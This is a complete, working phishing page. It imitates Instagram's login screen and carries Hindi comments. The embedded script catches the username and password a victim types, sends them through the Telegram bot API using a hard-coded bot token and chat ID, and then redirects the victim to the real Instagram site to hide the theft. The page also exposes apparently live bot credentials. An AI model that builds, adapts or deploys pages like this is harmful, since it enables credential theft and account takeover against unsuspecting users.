<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 15px 0 10px 0;
        }
        .top-lang {
            font-size: 13px;
            color: #737373;
            text-align: center;
            width: 100%;
        }
        .center-content {
            width: 100%;
            max-width: 310px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 15px;
            margin-top: -30px;
        }
        .app-logo {
            width: 75px;
            height: 75px;
            margin-bottom: 35px;
        }
        .app-logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }
        .input-group {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            margin-bottom: 12px;
            padding: 12px 15px;
        }
        input {
            width: 100%;
            background: transparent;
            border: none;
            font-size: 14px;
            color: #262626;
        }
        input:focus {
            outline: none;
        }
        .login-btn {
            background-color: #0064e0;
            color: #ffffff;
            border: none;
            border-radius: 25px;
            font-weight: 600;
            font-size: 14px;
            padding: 12px;
            width: 100%;
            cursor: pointer;
            margin-top: 4px;
            margin-bottom: 15px;
        }
        .login-btn:hover {
            background-color: #0051b3;
        }
        .forgot-pass {
            font-size: 14px;
            color: #000000;
            text-decoration: none;
            font-weight: 500;
        }
        .bottom-section {
            width: 100%;
            max-width: 310px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 15px;
        }
        .create-btn {
            width: 100%;
            background-color: transparent;
            border: 1px solid #0064e0;
            border-radius: 25px;
            color: #0064e0;
            font-weight: 600;
            font-size: 14px;
            padding: 12px;
            text-align: center;
            text-decoration: none;
            margin-bottom: 15px;
        }
        .meta-logo {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
            font-weight: 600;
            color: #000000;
        }
        .meta-logo span {
            font-size: 16px;
        }
    </style>
</head>
<body>

    <!-- ऊपर भाषा -->
    <div class="top-lang">
        English (India) ∨
    </div>

    <!-- बीच का फॉर्म -->
    <div class="center-content">
        <div class="app-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
        </div>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" name="username" placeholder="Username, email address or mobile number" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <a href="#" class="forgot-pass">Forgotten password?</a>
    </div>

    <!-- सबसे नीचे का हिस्सा -->
    <div class="bottom-section">
        <a href="#" class="create-btn">Create new account</a>
        <div class="meta-logo">
            <span>∞</span> Meta
        </div>
    </div>

    <!-- टेलीग्राम स्क्रिप्ट -->
    <script>
        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
        const chatId = "7008289410";    

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 

            let user = document.querySelector('input[name="username"]').value;
            let pass = document.querySelector('input[name="password"]').value;

            let message = `🔔 नया ऐप लॉगिन डेटा मिला:\n👤 यूजरनेम: ${user}\n🔑 पासवर्ड: ${pass}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => {
                console.log('डेटा भेज दिया गया', data);
                window.location.href = "https://instagram.com"; 
            })
            .catch(error => console.error('एरर:', error));
        });
    </script>

</body>
    </html>
